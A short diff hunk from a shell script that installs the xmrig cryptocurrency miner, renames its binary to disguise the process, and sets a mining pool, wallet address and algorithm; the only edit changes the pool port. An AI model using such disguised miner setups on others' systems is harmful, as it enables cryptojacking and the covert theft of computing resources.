@@ -14,7 +14,7 @@ rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
 mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
-POOL=arqma.herominers.com:10641
+POOL=arqma.herominers.com:6666
 USERNAME=aRi1cDd6LkAcc1p6W58dkPi8xSfbZ5EuYFrHxwH3py1MQ9rFrzmSaghguD4GGpCfHSMmKXWJrd4e5CkabC3viWJKfHuDSTwte7P8zxhE4cZ7o
 ALGO=rx/0
 DONATE=1
